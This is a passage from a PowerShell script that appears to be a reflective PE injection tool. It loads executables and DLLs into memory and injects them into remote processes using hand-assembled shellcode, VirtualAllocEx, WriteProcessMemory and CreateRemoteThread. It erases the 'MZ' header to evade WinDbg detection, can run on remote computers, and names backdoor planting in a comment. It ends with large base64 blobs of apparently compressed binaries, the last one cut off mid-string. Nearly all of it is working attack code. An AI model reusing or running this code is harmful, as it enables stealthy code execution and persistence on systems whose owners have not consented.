		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		

		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{


			
			
			
			#################################
			####
			########################
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			
			[IntPtr]$ExeMainFunctionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainFunctionPtr). Creating thread for the EXE to run in."
			
			
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainFunctionPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
			
		}
		
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	


		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
	
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
	
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

if ([IntPtr]::Size -eq 8) {
	$base64data="H4sIAGrIaF4C/+1Yf2gbdRQ/ENw/0qKbVtRaEEUsbJUNaoprwsBSUfqXCOIQ3Z+CIIUjZbXY/bBrmkvMJbf8zrKoXLK0d7m0ae9r0vYC1rVd1ySm/qGusqv4RxCs6epmp23v+b3k6tbOTfAfqdyHvLz3vu993733vt97f1zHm+/DBgCsYyIIgHaoIgv/jBcwXVtquwav/nbwaruSOnh1yOuxyQ477bOHXXIo7HTSlHwuINutTtnjlMeTnOyig4Hi6uqNRS3G9OIvT53KnOjcIrZnvfNkRT7ZeQJz6ouHO09X+IMVzntCXtVvZy5CBiB4fANOTbWMbq3VwvdwfVMBKGClfFthVTmrgCZvVusHuMXRBCa8XvisYu79K8BWnDv0bSI0TQIw9+hdFsdfg38BXEvpHuYiFeinMB8uawkt31aUBhngfNEeDFNhgA+0mGqR8NOOHPGvGHZabGo/NrTeqbFKd8RrAB27Eqhn7zeiwaierGgwqTcBGVrVi4Pmm+u+VbnBWFGPSOXqG4PIPQ8cJZpUu4INghRNJaXxi3ordejQoUOHDh06dOjQoUOHjv8vDhFXTCsAxJWOFb0Zuw8/TFR5cWL7erZwSx5Q5cLf7/dr67Ed9j+UTL+HEux0KGCzQWw97rFT1jAjMQwdAhjN8MOZ1HyuGGQY/Qz+S9yHeh6vrTuEJSkhCXwijvL7A4jkz2MqYZIRaRfQystjYyP5ZpQ3vTYVPr35tSwZm1clxVj/EC8lVC9ycgopTf4P+0vXN1e67Tgc2duF/1G3ifJhi0Ci0jiZlUWl6Yk4Ipol8nIXUp7TYmrRZhqsNamN1OJaZvqA9dkY9l/E/n6J/BVh+UcsS+Q63tYkxaTYJ1EWs6jEop69ssQTDVhhEbn8yChBEJ+i/NOceMTicXqcAQqkODI/KRpaU5bvbhKNHIc1jh3Jm/DjOU5suxg/84baC6KxTp1hFoul6KNpHxMohmgXsMhsFA2mlxSAir97A2+5YH6nRdtyDLOvhMDQiDuZv0B5HF4xJ3mFgtUVlbzpYDp+aXAsQg86ElLOlx7u8/cNRSIjQ2eY6bOXGY/I8JkBdtC1EE7k3ZQtkmKppH3YlT47vEA70vmBPt5bmKU/5mPRZCB3bsYanZidWRiIsP2fzzGJnFCIR9OOfgfPzfn7Cm5OSNjy3lxofjw5xl/ySbOztDU4Ou8BXACHm6Vmj9oh93blm7+AKze07hssfkk0InOL+0YEmWvcSyzv7Z0HEM0N7nUpKrZZ08eOVwvF/eJwL2pwmGrfDK0Lv5c+Ihq7TdYlZDB2/Yy3tY3XzjVU/RHxPLW57/W6ONa4qDvLiuYDxvqy+pW5rHrGjnKPaZ7vqUfyKI6NzM+odllN4H6xbfldc73m0vOijK9Sh5+8iZTD+In7Y7HDMTdEcRa1r7wVJxq1+7xnssrxJSDKE3efW3ebe9sn0865tX2qbWFtF7//fwJE+Z0uABwAAA=="

}else{
	$base64data="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